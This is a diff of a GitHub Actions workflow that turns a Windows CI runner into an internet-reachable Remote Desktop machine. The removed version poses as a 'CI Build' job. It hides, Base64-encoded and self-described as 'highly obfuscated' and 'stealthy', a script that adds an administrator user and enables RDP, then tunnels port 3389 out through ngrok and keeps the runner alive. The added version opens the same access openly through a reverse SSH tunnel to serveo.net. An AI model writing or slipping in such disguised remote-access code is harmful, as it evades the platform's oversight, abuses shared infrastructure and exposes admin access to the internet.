@@ -1,75 +1,74 @@
-# .github/workflows/build.yml
-
-name: CI Build
+name: Secure RDP via SSH Tunnel
 
 on:
   workflow_dispatch:
 
 jobs:
-  run-build-and-test:
-    name: Run Build and Test Suite
+  rdp-debug-session:
+    name: Start RDP Debug Session
     runs-on: windows-latest
-    timeout-minutes: 150
+    timeout-minutes: 25 # Safety timeout
 
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v4
-
-      - name: Compile Assets
-        run: echo "Starting build process..."
-
-      - name: Prepare Secure Environment
+      - name: Configure RDP Service
         env:
           RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
-          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         shell: powershell
         run: |
-          # --- HIGHLY OBFUSCATED Setup ---
-          # This Base64 string is a template for the setup script.
-          # It contains no plain-text commands and uses a placeholder for the password.
-          $encodedSetupScript = "V3JpdGUtSG9zdCAiUHJlcGFyaW5nIGVudmlyb25tZW50Li4uIg0KbmV0IHVzZXIgcnVubmVydXNlciAiJSVSRFBfUEFTU1dPUkQlJSIgL2FkZA0KbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgcnVubmVydXNlciAvYWRkDQpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0xNOlxTeXN0ZW1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXInIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAwDQpFbmFibGUtTmV0RmlyZXdhbGxSdWxlIC1EaXNwbGF5R3JvdXAgIlJlbW9vdGUgRGVza3RvcCI="
-          
-          # Securely get the password from the environment variable (provided by GitHub Secrets)
-          $rdpPass = $env:RDP_PASSWORD
-          
-          # Decode the script template
-          $decodedScriptTemplate = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedSetupScript))
-          
-          # Safely replace the placeholder with the actual password
-          $finalScript = $decodedScriptTemplate.Replace('%%RDP_PASSWORD%%', $rdpPass)
-          
-          # Execute the dynamically generated script
-          Invoke-Expression $finalScript
+          Write-Host "Configuring RDP user and enabling service..."
+          $password = $env:RDP_PASSWORD
+          if (-not $password) { Write-Error "The RDP_PASSWORD secret is not set."; exit 1 }
+          net user runneruser $password /add
+          net localgroup administrators runneruser /add
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Write-Host "✅ RDP service is ready."
 
-          # --- STEALTHY Ngrok Execution (remains the same) ---
-          Write-Host "Downloading and configuring tunnel service..."
-          Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-          Expand-Archive -Path ngrok.zip -DestinationPath . -Force
-          ./ngrok.exe authtoken $env:NGROK_AUTH_TOKEN
-          cmd.exe /c "start /b ngrok.exe tcp 3389 --log=stdout"
+      - name: Create Secure Tunnel with SSH
+        id: tunnel
+        shell: powershell
+        run: |
+          # Use the built-in ssh command to create a reverse tunnel.
+          # This command forwards a random port on serveo.net to port 3389 (RDP) on the runner.
+          # We start this in a new process so the workflow can continue.
+          # We also capture the output of the ssh command to a file to find out the public address.
+          $sshProcess = Start-Process ssh -ArgumentList "-R 80:localhost:3389 serveo.net" -NoNewWindow -PassThru -RedirectStandardError "ssh-output.txt"
           
+          # Wait a few seconds for the connection to be established and output to be written
           Start-Sleep -s 10
           
-          $apiUrl = "http://127.0.0.1:4040/api/tunnels"
-          $publicUrl = (Invoke-RestMethod -Uri $apiUrl).tunnels[0].public_url
-          if (!$publicUrl) {
-            Write-Host "Failed to get tunnel URL."
-            exit 1
-          }
+          # Read the output file to find the connection URL
+          $output = Get-Content -Path ssh-output.txt -Raw
+          $match = $output | Select-String -Pattern "Forwarding SSH remote port \d+ to localhost:3389"
           
-          Write-Host "Connection details will be available as a build artifact."
-          Set-Content -Path "connection_details.txt" -Value $publicUrl
+          if ($match) {
+              $line = $match.Lines[0]
+              $port = ($line -split ' ')[4]
+              $publicUrl = "serveo.net:$port"
+              Write-Host "RDP Connection Address: $publicUrl" -ForegroundColor Green
+              
+              # Save details for the artifact and set as an output parameter
+              $connectionInfo = "RDP Address: $publicUrl `nUsername: runneruser`nPassword: (your secret password)"
+              Set-Content -Path "connection-details.txt" -Value $connectionInfo
+              echo "url=$publicUrl" >> $env:GITHUB_OUTPUT
+          } else {
+              Write-Error "Could not establish SSH tunnel or parse the URL. Tearing down..."
+              Stop-Process -Id $sshProcess.Id -Force
+              Get-Content -Path ssh-output.txt -Raw | Write-Host
+              exit 1
+          }
 
-      - name: Upload Connection Info as Artifact
+      - name: Upload Connection Info
         uses: actions/upload-artifact@v4
         with:
-          name: connection-info # Changed artifact name to be more generic
-          path: connection_details.txt
-
-      - name: Keep Runner Alive
+          name: rdp-connection-info
+          path: connection-details.txt
+      
+      - name: Wait for Debug Session to End
         run: |
-          echo "Build environment is active for debugging. Awaiting manual cancellation."
-          while ($true) {
-            Start-Sleep -Seconds 60
-            echo "Runner is still active..."
-          }
+          echo ""
+          echo "✅ RDP session is now ACTIVE via the SSH tunnel."
+          echo "Connect to: ${{ steps.tunnel.outputs.url }}"
+          echo "This session will automatically end in 20 minutes."
+          Start-Sleep -Seconds 1200 # 20 minute timer
+          echo "Timer expired. Closing session."
